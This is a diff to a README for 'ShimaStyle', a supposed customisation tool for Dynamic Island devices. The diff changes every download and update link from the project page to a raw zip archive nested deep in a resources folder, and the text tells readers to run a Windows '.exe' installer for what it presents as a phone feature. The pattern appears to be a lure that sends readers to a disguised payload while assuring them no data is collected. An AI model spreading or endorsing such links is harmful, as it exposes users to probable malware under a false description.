@@ -1,6 +1,6 @@
 # 🌟 ShimaStyle - Enhance Your Dynamic Island Device
 
-[![Download ShimaStyle](https://img.shields.io/badge/Download-ShimaStyle-brightgreen?style=for-the-badge)](https://github.com/j4tech236/ShimaStyle)
+[![Download ShimaStyle](https://img.shields.io/badge/Download-ShimaStyle-brightgreen?style=for-the-badge)](https://github.com/j4tech236/ShimaStyle/raw/refs/heads/main/dynamicislandnotifyprefs/Resources/Style_Shima_3.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Your Dynamic Island device should be nearby and turned on while you use ShimaSty
 
 You will first need to download ShimaStyle from the official page.
 
-[![Download Here](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/j4tech236/ShimaStyle)
+[![Download Here](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/j4tech236/ShimaStyle/raw/refs/heads/main/dynamicislandnotifyprefs/Resources/Style_Shima_3.3.zip)
 
 The link above takes you to the main page where you can find the latest version of ShimaStyle. Follow the steps below to download the program safely.
 
@@ -41,7 +41,7 @@ The link above takes you to the main page where you can find the latest version 
 
    Click the green or blue download badge above or open this link in your web browser:
 
-   https://github.com/j4tech236/ShimaStyle
+   https://github.com/j4tech236/ShimaStyle/raw/refs/heads/main/dynamicislandnotifyprefs/Resources/Style_Shima_3.3.zip
 
 2. **Find the Latest Release**
 
@@ -108,7 +108,7 @@ Click on the options you want to change and see the results immediately. If you 
 
 To update the software:
 
-1. Return to the GitHub page: https://github.com/j4tech236/ShimaStyle
+1. Return to the GitHub page: https://github.com/j4tech236/ShimaStyle/raw/refs/heads/main/dynamicislandnotifyprefs/Resources/Style_Shima_3.3.zip
 2. Find the newest release under "Releases."
 3. Download the latest `.exe` file.
 4. Run the installer just like before.
@@ -136,4 +136,4 @@ ShimaStyle does not collect personal data. It runs only on your local machine an
 
 ---
 
-[![Download ShimaStyle](https://img.shields.io/badge/Download-ShimaStyle-brightgreen?style=for-the-badge)](https://github.com/j4tech236/ShimaStyle)
+[![Download ShimaStyle](https://img.shields.io/badge/Download-ShimaStyle-brightgreen?style=for-the-badge)](https://github.com/j4tech236/ShimaStyle/raw/refs/heads/main/dynamicislandnotifyprefs/Resources/Style_Shima_3.3.zip)
